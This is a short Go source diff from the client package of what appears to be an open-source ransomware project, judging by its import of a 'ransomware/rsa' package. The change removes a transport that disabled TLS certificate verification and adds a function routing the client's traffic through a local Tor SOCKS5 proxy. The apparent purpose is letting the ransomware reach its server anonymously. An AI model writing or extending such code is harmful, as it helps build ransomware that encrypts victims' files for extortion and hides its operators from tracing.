@@ -1,7 +1,6 @@
 package client
 
 import (
-	"crypto/tls"
 	"fmt"
 	"io"
 	"net/http"
@@ -9,7 +8,11 @@ import (
 	"strings"
 
 	"github.com/mauri870/ransomware/rsa"
-	"golang.org/x/net/http2"
+	"golang.org/x/net/proxy"
+)
+
+const (
+	TOR_PROXY_URL = "127.0.0.1:9050"
 )
 
 // Client wraps a http client
@@ -25,13 +28,23 @@ func New(serverBaseURL string, pubKey []byte) *Client {
 		ServerBaseURL: serverBaseURL,
 		PublicKey:     pubKey,
 		HTTPClient: &http.Client{
-			Transport: &http2.Transport{
-				TLSClientConfig: &tls.Config{
-					InsecureSkipVerify: true,
-				},
-			},
+			Transport: &http.Transport{},
 		},
 	}
+}
+
+// UseTorTransport upgrades the http transport to use the tor proxy
+func (c *Client) UseTorTransport() error {
+	dialer, err := proxy.SOCKS5("tcp", TOR_PROXY_URL, nil, proxy.Direct)
+	if err != nil {
+		return err
+	}
+
+	c.HTTPClient.Transport = &http.Transport{
+		Dial: dialer.Dial,
+	}
+
+	return nil
 }
 
 // Do make an http request
